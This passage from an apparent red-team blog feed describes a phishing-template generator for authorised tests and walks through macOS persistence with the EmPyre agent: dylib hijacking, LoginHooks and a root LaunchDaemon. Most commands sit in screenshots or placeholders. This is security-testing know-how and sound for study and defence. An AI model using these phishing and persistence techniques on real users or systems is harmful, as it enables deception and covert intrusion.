&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/pic5.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/pic5.png&#34; alt=&#34;pic5&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This generates a clean report on the sources queried and an ordered list of all emails gathered. This also allows for your report to show duplicate email address gathered, which is specifically handy in the case that you need to correlate an email to multiple sources. This helps clients and testers distinguish where trouble areas are and helps make recommendations based on external OSINT presence.  Of course, a standard text file with raw emails is also built.&lt;strong&gt; &lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/pic6.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/pic6.png&#34; alt=&#34;pic6&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;**Phishing Template Generation is an art: **&lt;/p&gt;

&lt;p&gt;Email template generation often takes a lot of time and effort to get right. This is largely due to ROE restrictions and stipulations put in place by different clients. Some clients say send the best you have, others want to pre-approve the template and even the payload in certain cases. Depending on the client they may even want to pick from a subset of templates. To make sure they have options, testers will generally develop multiple templates with varying degrees of sophistication. This can be a major, but necessary, pain for a tester.&lt;/p&gt;

&lt;p&gt;Current methodology for template generation is pretty standard and is highly variable per target organization type (government vs. civilian, service vs product based etc.). This complicates template generation for the following reasons:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Templates must have relevance to the client&lt;/li&gt;
&lt;li&gt;Templates must entice the target to act promptly&lt;/li&gt;
&lt;li&gt;Template payload must be supported by template subject/body&lt;/li&gt;
&lt;li&gt;Templates must be formatted correctly&lt;/li&gt;
&lt;li&gt;Templates should have unique text values build the legitimacy of the message body&lt;/li&gt;
&lt;li&gt;Multiple templates should be generated for failed phishing attempts&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;While this is quite an extensive list, this is merely the bare minimum to be successful at the initial stage of generating the template, let alone template theme or OSINT that is put into making the proper decisions to support the theme. Here is what my current model looks like from an operational prospective:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Conduct quick OSINT overview of the company&lt;/li&gt;
&lt;li&gt;Pick a template theme based on current news or info retrieved from OSINT&lt;/li&gt;
&lt;li&gt;Conduct research on the correct person/position to emulate in email if necessary&lt;/li&gt;
&lt;li&gt;Create a message body that supports either a link or attachment based payload&lt;/li&gt;
&lt;li&gt;Develop HTML by hand for the message body

&lt;ol&gt;
&lt;li&gt;If necessary, use outlook to build out .EML for rich HTML messages&lt;/li&gt;
&lt;li&gt;If using an old template, replace/insert necessary data inside of HTML which contains CSS&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;Use Cobalt Strike’s spear phish option to view the email&lt;/li&gt;
&lt;li&gt;Send test phish and make corrections&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This whole process is extremely time consuming to get correct and changes are often necessary to get the template 100%. If one thing is off it can affect the outcome of statistics as well as payload execution, and in many cases you only get one chance at this. I’ve found that when done correctly it was a solid 4-5 hours from start to finish. This is mainly due to reusing advanced templates and making necessary adjustments as needed. I set out to automate this process as much as possible with SimplyTemplate.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;SimplyTemplate&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt; &lt;/strong&gt;Getting started with SimplyTemplate is extremely easy and can be a great supplement for the above methodology to cut down on template generation time, reduce errors, and generate rich HTML sophisticated emails with ease. This tool aims to automate 80% of the template generation process, with the 20% you perform on your own hopefully resulting in a pull request!  To get started perform the following:
```&lt;br /&gt;
  1. git clone &lt;a href=&#34;https://github.com/killswitch-GUI/SimplyTemplate.git&#34;&gt;https://github.com/killswitch-GUI/SimplyTemplate.git&lt;/a&gt;
  2. ./Setup.sh (Kali 2 or Debian currently supported)
  3. install the required plugin when prompted into Ice Weasel&lt;br /&gt;
  4. ./SimplyTemplate.py –l&lt;/p&gt;

&lt;p&gt;To start, it helps to have an understanding of the module types so we can make accurate choices on template selection. All templates will provide you with a small meta tag. This tag will help you quickly identify the capabilities of the module, also what the &amp;ldquo;content&amp;rdquo; supports.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;High - Requires proper OSINT / Social Engineering to build and effectively deploy the template. These are generally internal based templates with specific themes.&lt;/li&gt;
&lt;li&gt;Medium - Requires a decent amount of modifications or settings, and are more general of a template external based template.&lt;/li&gt;
&lt;li&gt;Low - Requires little to no modifications of the template and are generally not effective.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Each template will support one or all of the following core options:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Text - Text based option or output.&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;Html - Rich Html Supported for output (generally multipart Email Html/Text).&lt;/li&gt;
&lt;li&gt;Link - Template supports a major link for stats or potential web download of document/Drive-by.&lt;/li&gt;
&lt;li&gt;Attachment - Can support text that tells users to open or use the supplied attachment.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Seeing how these templates are actually rendered is extremely important. This was an issue I’ve had with the current process for templates with anything other than basic HTML tags. Some phishing platforms have issues with rendering certain formats of email templates. I highly advise using a service like Litmus (&lt;a href=&#34;https://litmus.com&#34;&gt;https://litmus.com)&lt;/a&gt;) or  Mail-Tester (&lt;a href=&#34;https://www.mail-tester.com&#34;&gt;https://www.mail-tester.com)&lt;/a&gt;) to see how the email renders on multiple applications.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;HTML - This was used by some to view the HTML markup but CSS does not render correctly in some cases. (basic templates)&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;eml - Files can be outputted via .EML to open them directly in Icedove or Outlook&lt;/li&gt;
&lt;li&gt;mht - MHTML is the Mail Html Markup used and can directly rendered in Word/IE or Iceweasel via plugin&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let’s get started with building our first template and rendering these templates.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/pic7.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/pic7.png&#34; alt=&#34;pic7&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Currently the templates are broken up by the phishing category they support based on the following:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;External – Templates that would most likely come from external sources

&lt;ul&gt;
&lt;li&gt;News&lt;/li&gt;
&lt;li&gt;Agency&lt;/li&gt;
&lt;li&gt;Storage&lt;/li&gt;
&lt;li&gt;Social&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Internal – Templates that would come from internal departments or employees

&lt;ul&gt;
&lt;li&gt;Marketing&lt;/li&gt;
&lt;li&gt;IT&lt;/li&gt;
&lt;li&gt;HR&lt;/li&gt;
&lt;li&gt;Agency&lt;/li&gt;
&lt;li&gt;Facilities&lt;/li&gt;
&lt;li&gt;Leadership&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As you can see this is easily displayed with the (&lt;em&gt;list)&lt;/em&gt; command within.  We can also use the (&lt;em&gt;search&lt;/em&gt;) command to search for modules by sophistication or core options of the templates.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/pic8.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/pic8.png&#34; alt=&#34;pic8&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Execute the (&lt;em&gt;use&lt;/em&gt;) command with the corresponding number and you will be dropped into the relevant template menu. If more information is required, the &lt;em&gt;(info)&lt;/em&gt; command can be used to template variables and a more in-depth explanation.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/pic9.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/pic9.png&#34; alt=&#34;pic9&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Once in the template menu you have a few core commands. The first is the &lt;em&gt;(set)&lt;/em&gt; command, which allows you to set specific variables within the template. There are a set of default values that can be used, or you can provide your own. Each template will require a mix of different required values that must be set. You will also observe that higher the sophistication needed, the more OSINT is required and in turn the more settings that will need to be populated. Once all options are set, SimplyTemplate can generate the template on the fly and display the final outcome within a browser. This allows the tester to quickly make changes to settings to ensure the final result will look good on the targets end. Running the &lt;em&gt;(info)&lt;/em&gt; command will show the following changes:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/pic10.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/pic10.png&#34; alt=&#34;pic10&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;As mentioned before the (&lt;em&gt;render&lt;/em&gt;) command can be extremely informative to the tester:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/pic11.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/pic11.png&#34; alt=&#34;pic11&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Even the more advanced templates render nicely in the. mht format:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/pic12.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/pic12.png&#34; alt=&#34;pic12&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Depending on the template and the corresponding sophistication level the (&lt;em&gt;edit)&lt;/em&gt; function may be available. This will eventually be used in a majority of the modules to give testers greater freedom in generating templates. When using this function, you can edit the raw paragraphs of the template before rending or template generation takes place. This is a more advanced feature but allows you to quickly add small changes with out digging through hundred lines of template code to make a spelling or grammar change. This will spawn a custom Text Editor which you can make and save the changes.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/pic13.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/pic13.png&#34; alt=&#34;pic13&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Finally use the (&lt;em&gt;gen&lt;/em&gt;) command to quickly export the final product!&lt;/p&gt;

&lt;p&gt;As always I’m looking for improvements or suggestions on both SimplyEmail or SimplyTemplate, every bit helps produce a more useful platform!&lt;/p&gt;

&lt;p&gt;Here are the links:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/killswitch-GUI/SimplyEmail&#34;&gt;https://github.com/killswitch-GUI/SimplyEmail&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/killswitch-GUI/SimplyTemplate&#34;&gt;https://github.com/killswitch-GUI/SimplyTemplate&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>The Return of the EmPyre</title>
      <link>http://dev.cybersyndicates.com/2016/05/return-empyre-series-3/</link>
      <pubDate>Tue, 24 May 2016 14:34:01 +0000</pubDate>
      
      <guid>http://dev.cybersyndicates.com/2016/05/return-empyre-series-3/</guid>
      <description>

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/empyre_logo_white_background.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/empyre_logo_white_background.png&#34; alt=&#34;empyre_logo_white_background&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This post is number 3 of the EmPyre series and cross post with a fellow friend and ATD co-worker &lt;a href=&#34;https://twitter.com/xorrior&#34;&gt;@xorrior&lt;/a&gt;. Thanks to the entire ATD family and dev team of EmPyre:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://twitter.com/424f424f&#34;&gt;@rvrsh3ll&lt;/a&gt;  &amp;ndash; &lt;a href=&#34;https://twitter.com/harmj0y&#34;&gt;@harmj0y&lt;/a&gt; &amp;ndash; &lt;a href=&#34;https://twitter.com/xorrior&#34;&gt;@xorrior&lt;/a&gt; &amp;ndash; &lt;a href=&#34;https://twitter.com/CptJesus&#34;&gt;@CptJesus&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;EmPyre can be found here: &lt;a href=&#34;https://github.com/adaptivethreat/EmPyre&#34;&gt;https://github.com/adaptivethreat/EmPyre&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;5/12/16 – &lt;a href=&#34;http://www.harmj0y.net/blog/?p=2637&amp;amp;preview=true&#34;&gt;&lt;strong&gt;Building an EmPyre with Python&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;5/18/16 – &lt;a href=&#34;http://www.rvrsh3ll.net/blog/empyre/operating-with-empyre/&#34;&gt;&lt;strong&gt;Operating with EmPyre&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;  &lt;/p&gt;

&lt;h2 id=&#34;empyre-persistence&#34;&gt;EmPyre Persistence&lt;/h2&gt;

&lt;p&gt;Mac OS X offers several methods to abuse system functionality and obtain persistence through reboots. One of the most effective methods is &lt;a href=&#34;https://www.virusbulletin.com/virusbulletin/2015/03/dylib-hijacking-os-x/&#34;&gt;Dylib Hijacking&lt;/a&gt;. Dylibs are comparable to DLLs in that they contain code executed by applications at runtime. Dylib Hijacking exists because of how “dyld”, the system dynamic linker, searches and loads these libraries. Let’s briefly examine the Mach-O header to understand why this vulnerability exists.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 1&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Picture1.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Picture1.png&#34; alt=&#34;Picture1&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 2&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Picture2.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Picture2.png&#34; alt=&#34;Picture2&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Figure 1 depicts the load commands for Xcode. Load commands provide the OS loader with instructions on where to find the application&amp;rsquo;s entry point, offsets for the text and data sections, and all of the libraries needed by the application at runtime. The “Name” field in the LC_LOAD_DYLIB load command identifies the file path to the DVTFoundation library. Notice that the path is prepended with @rpath. This signals to the OS loader to examine the LC_RPATH (Figure 2) load commands in order to expand the @rpath variable. Each path is searched in succession by dyld to locate the required library. Once the library is found it is loaded into the application at runtime. The issue is that any library planted in an LC_RPATH that is found before the legitimate dylib, will be loaded first. A slight variation to this attack, which we won’t cover in this post, involves the LC_LOAD_WEAK_DYLIB load command. This indicates that the specified dylib is not required but will be loaded if found. If the specified library is not present on the system, we can plant the dylib in the specified path and it will be loaded by the application at runtime. For more information on Dylib Hijacks for weak dylibs, please read the &lt;a href=&#34;https://www.virusbulletin.com/virusbulletin/2015/03/dylib-hijacking-os-x/&#34;&gt;white paper&lt;/a&gt; on Dylib Hijacks by @patrickwardle. The load commands slightly differ but still offer the same way to conduct this attack. We can abuse dyld’s load order to obtain consistent code execution and/or persistence in OS X.&lt;/p&gt;

&lt;p&gt;Before we can weaponize Dylib Hijacks, there is a small problem to address. When an application normally loads a library, the os loader will try to resolve symbols for functions required by the application. If those functions are not found, the application will crash. To remedy this, the hijacking dylib will need to have a LC_REEXPORT_DYLIB load command that provides the path to the legitimate dylib. When the application starts, it will load the attacking dylib first and then load the legitimate dylib.&lt;/p&gt;

&lt;p&gt;To carry out this attack in EmPyre, you will need to first run the HijackScanner module in situational_awareness/host/osx/. This is simply an adaption to @patrickwardle’s &lt;a href=&#34;https://github.com/synack/DylibHijack/blob/master/scan.py&#34;&gt;python script&lt;/a&gt; to scan the system for Mach-O binaries, load each and examine the load commands to determine if the application is vulnerable.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 3&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Picture3.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Picture3.png&#34; alt=&#34;Picture3&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;With the default options for the module, every Mach-O binary on the file system will be examined, which can take quite some time. To speed up the scan, set a path or only scan loaded process executables. Once the scan is finished, your output will provide you with the path to the vulnerable binary and the full path to where an EmPyre dylib should be planted. You will also need to locate the legitimate dylib for the next module in this attack.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 4&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Picture4.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Picture4.png&#34; alt=&#34;Picture4&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Here we see that the Xcode application is vulnerable to a dylib hijack with the DVTFoundation library. Instructions are provided after the scan output to gather the information necessary for the next module.&lt;/p&gt;

&lt;p&gt;The CreateHijacker module in persistence/osx/ configures an EmPyre dylib to be used in a Dylib Hijack. This is yet another slightly &lt;a href=&#34;https://github.com/synack/DylibHijack/blob/master/createHijacker.py&#34;&gt;modified script&lt;/a&gt; written by @patrickwardle. This module does all the heavy lifting for configuring the EmPyre dylib and patching in the path to the legitimate dylib.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 5&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Picture5.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Picture5.png&#34; alt=&#34;Picture5&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The Listener, UserAgent, and Arch options are all used to generate the hijacker dylib. Be sure that the architecture of the dylib matches the architecture of the vulnerable application. The “LegitimateDylibPath” option will define the full path to the legitimate dylib loaded into the application. The “vulnerableRPATH” refers to the rpath value returned from the HijackScanner module. Once we have all of our options set, we can execute the module.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 6&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Picture6.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Picture6.png&#34; alt=&#34;Picture6&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In Figure 6, we see that once the module is completed, an EmPyre dylib is configured and copied to the vulnerable rpath we specified. When we start the Xcode application, we receive a new EmPyre agent running in that application’s process!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 7&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Picture7.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Picture7.png&#34; alt=&#34;Picture7&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 8&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Picture8.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Picture8.png&#34; alt=&#34;Picture8&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Important Note: In some cases, killing the agent will close the application. Closing the application will always kill the agent.&lt;/p&gt;

&lt;h2 id=&#34;loginhooks&#34;&gt;LoginHooks&lt;/h2&gt;

&lt;p&gt;Just like the many supported startup locations and run keys within Windows, OS X offers a few which are deprecated but still functional (&lt;a href=&#34;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html#//apple_ref/doc/uid/10000172i-SW1-SW1&#34;&gt;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html#//apple_ref/doc/uid/10000172i-SW1-SW1&lt;/a&gt;). On the newest version of OS X, El Capitan,  “LoginHooks” seem to be an extremely reliable method of persistence and can be removed with ease. Here are a few things to note about “LoginHooks” and how they can be used:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;     Permissions for your script file should include execute privileges for the appropriate users.&lt;/li&gt;
&lt;li&gt;     The payload will execute for any user that logs in.&lt;/li&gt;
&lt;li&gt;     Only one copyof each script can be installed at a time and root privileges are needed!&lt;/li&gt;
&lt;li&gt;     If a user variable is required for login logic the $1 is passed your script.&lt;/li&gt;
&lt;li&gt;     Other login actions wait until your hook finishes executing&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;A benefit to using LoginHooks is the ease of installation, and target system info enumeration using the “defaults” tool. This tool also allows you to write settings to multiple sub system settings. Here is manual process to  setup a Hook:&lt;/p&gt;

&lt;p&gt;[snippet id=&amp;ldquo;37&amp;rdquo;]&lt;/p&gt;

&lt;p&gt;To remove this hook all you would need to do is use the defaults tool to delete it:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[snippet id=&amp;quot;35&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lastly to read the hook settings you setup:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[snippet id=&amp;quot;36&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here is a small demo I setup to show the install process of the LoginHook. First start out by setting up EmPyre, creating a listener, and getting your launcher executed in your test VM. Once the C2 is set up we will need to build out AppleScript that will be used for the persistence execution.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 9&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Picture9.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Picture9.png&#34; alt=&#34;Picture9&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This will output AppleScript with a simple stager to the current working directory. Next, we will have to upload the script to a directory of the operator’s choice. In this case, I just used the /tmp/ directory store my “evilscript”. To set up the hook is very simple, set the user password, this is for the sudo that takes place to install the hook and creating proper permissions on the script. This can be seen being set up in Figure 9.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 10&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Picture10.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Picture10.png&#34; alt=&#34;Picture10&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Running the defaults read command we covered earlier will result in the output of the LoginHook location, this is to ensure our hook is in place:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 11&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Picture11.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Picture11.png&#34; alt=&#34;Picture11&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;At this point, the LoginHook is properly setup and installed. Anytime the user logs in, the agent will be executed. It should be noted that this method of persistence is widely known and signatured by anti-virus solutions that look for OS X specific persistence.  &lt;/p&gt;

&lt;h2 id=&#34;launchdaemon-s&#34;&gt;LaunchDaemon’s&lt;/h2&gt;

&lt;p&gt;As we talked about earlier, Apple does not approve of the many methods used to stay persistent or they are purely outdated according to the Apple development references (&lt;a href=&#34;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html#//apple_ref/doc/uid/10000172i-SW1-SW1&#34;&gt;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html#//apple_ref/doc/uid/10000172i-SW1-SW1&lt;/a&gt;). But when it comes to launching custom daemons, using ‘launchd’ is the preferred method according to Apple&amp;rsquo;s development documentation. One of the major concerns with LoginHooks are the blocking nature during execution. LoginHooks are executed during the start of a logon session, which is an inline execution of the script. If at anytime this hangs or does not launch correctly it will deadlock the user from logging in. Using launchdaemons allows you live outside of user context, giving it an amazing benefit of how execution takes place. Here are few benefits of using a daemon:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Supports inetd-style daemons&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;launchd runs as root ( Keeps it easy to run )&lt;/li&gt;
&lt;li&gt;Daemons launch on demand, communication requests do not fail if the daemon is not launched ( Just in case you mess up )&lt;/li&gt;
&lt;li&gt;If taxed they are simply delayed until the daemon can launch and process them. ( important as they are not blocking on login etc)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If these reasons are not enough for an operator, I don’t know what is. It’s an extremely clean and safe method of staying persistent on your target; however few downsides do exist:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Many defensive tools look here for persistence (as it’s a limited attack surface)&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;KnockKnock  - &lt;a href=&#34;https://objective-see.com/products/knockknock.html&#34;&gt;https://objective-see.com/products/knockknock.html&lt;/a&gt;&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;Uninstallation is a few extra steps.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We should first cover how the OS boot process works at high level to understand where your persistence will be living. When starting to work in the persistence realm, it&amp;rsquo;s extremely important to understand the small nuances such as system daemons and user agent daemons. Here is a chart I put together to quickly understand how daemons are executed upon boot and login.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 12&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Picture12.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Picture12.png&#34; alt=&#34;Picture12&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Currently EmPyre supports installing a “SYSTEM” level daemon running as root that is not dependent on a user being active. This can be very important in some cases and gives you an advantage compared to other methods. Now in Figure 11 we mentioned that the launchd service will locate the plist (property list) file, this is the core of the service and passes the required options that are associated with the service. When launchd starts up it will parse this file and decide when to start, pass arguments or listen on SOCKETS for IPC (Inter Process Communication) so it important that we have an idea of what we are installing. Here is the plist file used:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 13&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Picture13.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Picture13.png&#34; alt=&#34;Picture13&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;A few main things should be noted, the Label key string value will be the name of the daemon, in this case the default Is “com.proxy.initialize”. Whereas the array string will be location plus the executable. Finally the key “RunAtLoad” and “KeepAlive” tells launchd to start at system init and stay running rather than a one-time process.&lt;/p&gt;

&lt;p&gt;To install the daemon you perform the following. Start by elevating your context to root.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 14&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Picture14.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Picture14.png&#34; alt=&#34;Picture14&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;After you have an elevated agent we can go ahead and setup the persistence, using the “persistence/osx/launchdaemonexecutable”.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 15&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Picture15.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Picture15.png&#34; alt=&#34;Picture15&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;That’s it, EmPyre does all the nitty-gritty work of creating the executable, writing it to disk, building the plist and registering it to launchd! When testing is complete we can use the “RemoveDaemon” module to properly clean up. (*Remember to take notes on the paths during install!)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 16&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Picture16.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Picture16.png&#34; alt=&#34;Picture16&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Hope this can get you started and maybe give you some ideas of where persistence can also be installed!&lt;/p&gt;

&lt;p&gt;References :&lt;/p&gt;

&lt;p&gt;OS X Persistence-&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf&#34;&gt;https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;OS X boot Process-&lt;/p&gt;

